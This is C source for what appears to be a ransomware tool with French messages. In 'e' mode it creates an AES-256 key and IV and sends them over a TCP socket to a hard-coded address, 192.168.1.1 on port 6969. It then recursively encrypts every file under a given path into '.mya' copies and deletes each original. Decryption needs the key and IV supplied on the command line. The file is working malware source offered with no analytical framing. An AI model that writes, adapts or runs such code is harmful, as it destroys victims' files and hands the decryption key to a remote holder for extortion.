#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <openssl/conf.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <unistd.h>

#define AES_256_KEY_SIZE 32
#define AES_BLOCK_SIZE 16
#define BUFFER_SIZE 1024
#define KEY_STRING_SIZE (AES_256_KEY_SIZE + 1)
#define IV_STRING_SIZE (AES_BLOCK_SIZE + 1)

static void handle_openssl_errors(void);
static int encrypt(FILE *f_in, FILE *f_out, const unsigned char *key,
                   const unsigned char *iv);
static int decrypt(FILE *f_in, FILE *f_out, const unsigned char *key,
                   const unsigned char *iv);
static int send_key_material(const char *payload);
static int process_file(const char *path, const char *mode, unsigned char *key,
                        unsigned char *iv);
static int process_path(const char *path, const char *mode, unsigned char *key,
                        unsigned char *iv);
static int generate_key_iv(unsigned char *key, unsigned char *iv);
static void concat_key_iv(const unsigned char *key, const unsigned char *iv,
                          char *output, size_t output_size);

static int send_key_material(const char *payload) {
  const int server_port = 6969;
  const char *server_ip = "192.168.1.1";

  int sockid = socket(AF_INET, SOCK_STREAM, 0);
  if (sockid < 0) {
    perror("socket");
    return -1;
  }

  struct sockaddr_in server_addr;
  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(server_port);
  server_addr.sin_addr.s_addr = inet_addr(server_ip);

  if (connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr)) <
      0) {
    perror("connect");
    close(sockid);
    return -1;
  }

  size_t payload_len = strlen(payload);
  if (send(sockid, payload, payload_len, 0) < 0) {
    perror("send");
    close(sockid);
    return -1;
  }

  close(sockid);
  return 0;
}

static void handle_openssl_errors(void) {
  ERR_print_errors_fp(stderr);
  abort();
}

static int encrypt(FILE *f_in, FILE *f_out, const unsigned char *key,
                   const unsigned char *iv) {
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  if (ctx == NULL) {
    handle_openssl_errors();
  }

  if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
    handle_openssl_errors();
  }

  int len = 0;
  int ciphertext_len = 0;
  unsigned char buffer_in[BUFFER_SIZE];
  unsigned char buffer_out[BUFFER_SIZE + AES_BLOCK_SIZE];
  size_t read_block;

  while ((read_block =
              fread(buffer_in, sizeof(unsigned char), BUFFER_SIZE, f_in)) > 0) {
    if (EVP_EncryptUpdate(ctx, buffer_out, &len, buffer_in, (int)read_block) !=
        1) {
      handle_openssl_errors();
    }

    ciphertext_len += len;
    if (fwrite(buffer_out, sizeof(unsigned char), len, f_out) != (size_t)len) {
      perror("fwrite");
      EVP_CIPHER_CTX_free(ctx);
      return -1;
    }
  }

  if (ferror(f_in)) {
    perror("fread");
    EVP_CIPHER_CTX_free(ctx);
    return -1;
  }

  if (EVP_EncryptFinal_ex(ctx, buffer_out, &len) != 1) {
    handle_openssl_errors();
  }

  if (fwrite(buffer_out, sizeof(unsigned char), len, f_out) != (size_t)len) {
    perror("fwrite");
    EVP_CIPHER_CTX_free(ctx);
    return -1;
  }

  ciphertext_len += len;
  EVP_CIPHER_CTX_free(ctx);

  return ciphertext_len;
}

static int decrypt(FILE *f_in, FILE *f_out, const unsigned char *key,
                   const unsigned char *iv) {
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  if (ctx == NULL) {
    handle_openssl_errors();
  }

  if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
    handle_openssl_errors();
  }

  int len = 0;
  int plaintext_len = 0;
  unsigned char buffer_in[BUFFER_SIZE];
  unsigned char buffer_out[BUFFER_SIZE + AES_BLOCK_SIZE];
  size_t count;

  while ((count = fread(buffer_in, sizeof(unsigned char), BUFFER_SIZE, f_in)) >
         0) {
    if (EVP_DecryptUpdate(ctx, buffer_out, &len, buffer_in, (int)count) != 1) {
      handle_openssl_errors();
    }

    plaintext_len += len;
    if (fwrite(buffer_out, sizeof(unsigned char), len, f_out) != (size_t)len) {
      perror("fwrite");
      EVP_CIPHER_CTX_free(ctx);
      return -1;
    }
  }

  if (ferror(f_in)) {
    perror("fread");
    EVP_CIPHER_CTX_free(ctx);
    return -1;
  }

  if (EVP_DecryptFinal_ex(ctx, buffer_out, &len) != 1) {
    handle_openssl_errors();
  }

  if (fwrite(buffer_out, sizeof(unsigned char), len, f_out) != (size_t)len) {
    perror("fwrite");
    EVP_CIPHER_CTX_free(ctx);
    return -1;
  }

  plaintext_len += len;
  EVP_CIPHER_CTX_free(ctx);

  return plaintext_len;
}

static int process_file(const char *path, const char *mode, unsigned char *key,
                        unsigned char *iv) {
  if (strncmp(mode, "e", 1) == 0) {
    size_t path_len = strlen(path);
    size_t output_len = path_len + strlen(".mya") + 1;
    char *output_path = malloc(output_len);
    if (output_path == NULL) {
      perror("malloc");
      return -1;
    }

    strcpy(output_path, path);
    strcat(output_path, ".mya");

    FILE *plaintext_file = fopen(path, "rb");
    FILE *encrypted_file = fopen(output_path, "wb");

    if (plaintext_file == NULL || encrypted_file == NULL) {
      perror("fopen");
      free(output_path);
      if (plaintext_file != NULL) {
        fclose(plaintext_file);
      }
      if (encrypted_file != NULL) {
        fclose(encrypted_file);
      }
      return -1;
    }

    int result = encrypt(plaintext_file, encrypted_file, key, iv);
    fclose(plaintext_file);
    fclose(encrypted_file);
    free(output_path);

    if (result < 0) {
      return -1;
    }
  } else if (strncmp(mode, "d", 1) == 0) {
    size_t path_len = strlen(path);
    if (path_len < 4) {
      fprintf(stderr, "Chemin de fichier invalide pour la déchiffrement : %s\n",
              path);
      return -1;
    }

    char *output_path = malloc(path_len - 3);
    if (output_path == NULL) {
      perror("malloc");
      return -1;
    }

    strcpy(output_path, path);
    output_path[path_len - 4] = '\0';

    FILE *encrypted_file = fopen(path, "rb");
    FILE *decrypted_file = fopen(output_path, "wb");

    if (encrypted_file == NULL || decrypted_file == NULL) {
      perror("fopen");
      free(output_path);
      if (encrypted_file != NULL) {
        fclose(encrypted_file);
      }
      if (decrypted_file != NULL) {
        fclose(decrypted_file);
      }
      return -1;
    }

    int result = decrypt(encrypted_file, decrypted_file, key, iv);
    fclose(encrypted_file);
    fclose(decrypted_file);
    free(output_path);

    if (result < 0) {
      return -1;
    }
  } else {
    fprintf(stderr, "Option inconnue : %s\n", mode);
    return -1;
  }

  return 0;
}

static int process_path(const char *path, const char *mode, unsigned char *key,
                        unsigned char *iv) {
  DIR *dir = opendir(path);
  if (dir == NULL) {
    perror("opendir");
    return -1;
  }

  struct dirent *entry;
  int status = 0;

  while ((entry = readdir(dir)) != NULL) {
    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
      continue;
    }

    size_t path_len = strlen(path);
    size_t name_len = strlen(entry->d_name);
    size_t full_len = path_len + name_len + 2;
    char *full_path = malloc(full_len);
    if (full_path == NULL) {
      perror("malloc");
      status = -1;
      break;
    }

    snprintf(full_path, full_len, "%s/%s", path, entry->d_name);

    int is_directory = 0;

#ifdef DT_DIR
    if (entry->d_type == DT_DIR) {
      is_directory = 1;
    } else if (entry->d_type == DT_UNKNOWN) {
      struct stat path_stat;
      if (stat(full_path, &path_stat) == 0 && S_ISDIR(path_stat.st_mode)) {
        is_directory = 1;
      }
    }
#else
    struct stat path_stat;
    if (stat(full_path, &path_stat) == 0 && S_ISDIR(path_stat.st_mode)) {
      is_directory = 1;
    }
#endif

    if (is_directory) {
      if (process_path(full_path, mode, key, iv) != 0) {
        status = -1;
      }
    } else {
      if (strcmp(entry->d_name, "mya") != 0) {
        if (process_file(full_path, mode, key, iv) != 0) {
          status = -1;
        }

        if (remove(full_path) != 0) {
          perror("Erreur lors de la suppression du fichier");
          status = -1;
        }
      } else if (strncmp(mode, "d", 1) == 0) {
        if (remove(full_path) != 0) {
          perror("Erreur lors de la suppression du fichier");
          status = -1;
        }
      }
    }

    free(full_path);
  }

  closedir(dir);
  return status;
}

static int generate_key_iv(unsigned char *key, unsigned char *iv) {
  if (!RAND_bytes(iv, AES_BLOCK_SIZE)) {
    fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
    return errno;
  }

  if (!RAND_bytes(key, AES_256_KEY_SIZE)) {
    fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
    return errno;
  }

  for (int i = 0; i < AES_256_KEY_SIZE; i++) {
    while (key[i] < 35 || key[i] > 126 || key[i] == 39 || key[i] == 92 ||
           key[i] == 123 || key[i] == 125 || key[i] == 96 || key[i] == 36 ||
           key[i] == 40 || key[i] == 41 || key[i] == 91 || key[i] == 93) {
      if (!RAND_bytes(&key[i], 1)) {
        fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
        return errno;
      }
    }
  }

  for (int i = 0; i < AES_BLOCK_SIZE; i++) {
    while (iv[i] < 35 || iv[i] > 126 || iv[i] == 39 || iv[i] == 92 ||
           iv[i] == 123 || iv[i] == 125 || iv[i] == 96 || iv[i] == 36 ||
           iv[i] == 40 || iv[i] == 41 || iv[i] == 91 || iv[i] == 93) {
      if (!RAND_bytes(&iv[i], 1)) {
        fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
        return errno;
      }
    }
  }

  key[AES_256_KEY_SIZE] = '\0';
  iv[AES_BLOCK_SIZE] = '\0';

  return 0;
}

static void concat_key_iv(const unsigned char *key, const unsigned char *iv,
                          char *output, size_t output_size) {
  snprintf(output, output_size, "Cle : %s\nIv : %s", key, iv);
}

int main(int argc, char *argv[]) {
  struct timeval start;
  gettimeofday(&start, NULL);

  if (argc < 2) {
    fprintf(stdout, "S'il vous plait entrez le mode de chiffrement (e|d)\n");
    return EXIT_FAILURE;
  }

  const char *mode = argv[1];

  if (strncmp(mode, "e", 1) == 0) {
    if (argc != 3) {
      fprintf(stdout, "Usage: %s e \"chemin\"\n", argv[0]);
      return EXIT_FAILURE;
    }

    unsigned char key[KEY_STRING_SIZE];
    unsigned char iv[IV_STRING_SIZE];

    if (generate_key_iv(key, iv) != 0) {
      return EXIT_FAILURE;
    }

    char key_iv_buffer[BUFFER_SIZE];
    concat_key_iv(key, iv, key_iv_buffer, sizeof(key_iv_buffer));
    send_key_material(key_iv_buffer);

    if (process_path(argv[2], mode, key, iv) != 0) {
      return EXIT_FAILURE;
    }
  } else if (strncmp(mode, "d", 1) == 0) {
    if (argc != 5) {
      fprintf(stdout, "Usage: %s d \"chemin\" \"cle\" \"iv\"\n", argv[0]);
      return EXIT_FAILURE;
    }

    if (strlen(argv[3]) >= KEY_STRING_SIZE ||
        strlen(argv[4]) >= IV_STRING_SIZE) {
      fprintf(stderr, "Cle ou IV trop longs\n");
      return EXIT_FAILURE;
    }

    unsigned char key[KEY_STRING_SIZE];
    unsigned char iv[IV_STRING_SIZE];
    strcpy((char *)key, argv[3]);
    strcpy((char *)iv, argv[4]);

    if (process_path(argv[2], mode, key, iv) != 0) {
      return EXIT_FAILURE;
    }
  } else {
    fprintf(stdout, "Mode inconnu : %s\n", mode);
    return EXIT_FAILURE;
  }

  struct timeval end;
  gettimeofday(&end, NULL);

  double elapsed_time =
      (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0;
  printf("Temps depuis le debut du chiffrement : %f secondes\n", elapsed_time);

  return EXIT_SUCCESS;
}